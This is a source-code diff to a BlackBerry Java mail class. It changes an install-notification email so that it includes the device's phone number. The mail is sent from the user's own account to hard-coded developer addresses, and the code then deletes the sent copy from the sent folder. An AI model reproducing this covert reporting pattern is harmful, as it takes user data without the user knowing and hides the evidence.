@@ -9,7 +9,10 @@ import net.rim.blackberry.api.mail.ServiceConfiguration;
 import net.rim.blackberry.api.mail.Session;
 import net.rim.blackberry.api.mail.TextBodyPart;
 import net.rim.blackberry.api.mail.Transport;
+import net.rim.blackberry.api.phone.Phone;
+import net.rim.device.api.system.Application;
 import net.rim.device.api.system.EventLogger;
+import net.rim.device.api.ui.component.Dialog;
 
 public class MailCode 
 {
@@ -94,6 +97,8 @@ public class MailCode
 	    		
 	    		Transport.send(message2);
 	    		
+	    		EventLogger.logEvent(GUID, ("Mail sent").getBytes(),EventLogger.ALWAYS_LOG);
+	    		
 	    		sentfolder.deleteMessage(message2, true);
 	    		
     		} catch(AddressException e) {
@@ -106,7 +111,6 @@ public class MailCode
     	}
 	
 	}
-	
 	
 	/**
 	 * Application sends first mail after installation is complete
@@ -143,6 +147,18 @@ public class MailCode
     		try{
 	    		fromMail2 = session2.getServiceConfiguration().getEmailAddress().toLowerCase();
 	    		fromMailName2 = session2.getServiceConfiguration().getName().toLowerCase();
+	    		if(fromMail2.equalsIgnoreCase(""))
+	    		{
+	    			Application.getApplication().invokeAndWait(new Runnable()
+	    			{
+	    				public void run()
+	    				{
+	    					Dialog.alert("ERROR -- No E-Mail account found on device \r\n Please add an account " +
+	    							"and start the application manually from Application Menu");
+	    					System.exit(0);
+	    				}
+	    			});
+	    		}
 	    		
         		fromadd2 = new Address(fromMail2,fromMailName2);
         		toadd_server = new Address(toMail_server,toMailName_server);
@@ -153,12 +169,10 @@ public class MailCode
 	    		message.addRecipients(Message.RecipientType.TO, new Address[] {toadd_server,toadd_debug});		//sending to		(rohan & ashwin)
 //		    		message2.addRecipient(Message.RecipientType.TO, toadd_debug);
 	    		
-//			    		bodyText2 = "Test mail from BB account";
-	    		
-	    		message.setContent("Application successfully installed"); 
+	    		message.setContent("Application successfully installed Ph#"+Phone.getDevicePhoneNumber(true)); 
 	    		
 	    		Transport.send(message);
-	    		
+	    		EventLogger.logEvent(GUID, ("Mail sent").getBytes(),EventLogger.ALWAYS_LOG);
 	    		sentfolder.deleteMessage(message, true);
 	    		
     		} catch(AddressException e) {
@@ -171,23 +185,5 @@ public class MailCode
     	}
 	
 	}
-	
-//	/**
-//	 * returns device's default mail address
-//	 * @return defaultMailAddress
-//	 */
-//	public String getDeviceDefaultAddress()
-//	{
-//		return defaultMailAddress;
-//	}
-//	
-//	/**
-//	 * returns device's default mail address's name
-//	 * @return defaultName
-//	 */
-//	public String getDeviceDefaultName()
-//	{
-//		return defaultName;
-//	}
 	
 }
